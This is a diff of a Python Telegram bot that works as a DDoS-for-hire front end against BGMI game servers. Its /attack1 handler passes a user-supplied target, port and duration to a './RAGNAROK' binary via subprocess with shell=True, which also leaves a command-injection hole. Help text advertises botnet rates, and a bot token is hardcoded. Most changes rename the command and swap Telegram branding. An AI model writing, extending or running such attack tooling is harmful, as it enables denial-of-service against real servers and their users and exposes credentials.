@@ -14,7 +14,7 @@ bot = telebot.TeleBot('7570618579:AAF4Rfsrw6FPrzpTkgSS6Kva4PxyC0lJ_bg')
 admin_id = ["1232759277"]
 
 # File to store allowed user IDs
-USER_FILE = "users.txt", "1232759277"
+USER_FILE = "users.txt"
 
 # File to store command logs
 LOG_FILE = "log.txt"
@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY BKM.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy https://t.me/BKMOMNIVERSE"
+    response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY HELLA.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy https://t.me/BKMOMNIVERSE"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /attack1 command
@@ -218,7 +218,7 @@ bgmi_cooldown = {}
 
 # Handler for /attack1 command
 
-@bot.message_handler(commands=['attack'])
+@bot.message_handler(commands=['attack1'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -228,7 +228,7 @@ def handle_bgmi(message):
                 time_since_last_attack = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                 if time_since_last_attack < 300:
                     remaining_time = 300 - time_since_last_attack
-                    response = f"You are on cooldown. Please wait {remaining_time} seconds before running the /attack command again."
+                    response = f"You are on cooldown. Please wait {remaining_time} seconds before running the /attack1 command again."
                     bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -247,9 +247,9 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./RAGNAROK {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
-                response = f"YOUR FATHER BKM 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/BKMOMNIVERSE"
+                response = f"RAGNAROK 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/BKMOMNIVERSE"
         else:
-            response = "Usage :- /attack <target> <port> <time>\nBy https://t.me/BKMOMNIVERSE"  # Updated command syntax
+            response = "Usage :- /attack1 <target> <port> <time>\nBy https://t.me/RAGNAROKCRACKER"  # Updated command syntax
     else:
         response = "You Are Not User's To Authorized To Use This Command.\nBy STORM BOT DM TO GET ACCESS @RAGNAROKCRACKER"
 
@@ -281,7 +281,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''Available commands:
- /attack : Method For Bgmi Servers. 
+ /attack1 : Method For Bgmi Servers. 
  /rules : Please Check Before Use !!.
  /mylogs : To Check Your Recents Attacks.
  /plan : Checkout Our Botnet Rates.
@@ -350,7 +350,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By https://t.me/BKMOMNIVERSE
+By https://t.me/RAGNAROKCRACKER
 '''
     bot.reply_to(message, response)
 
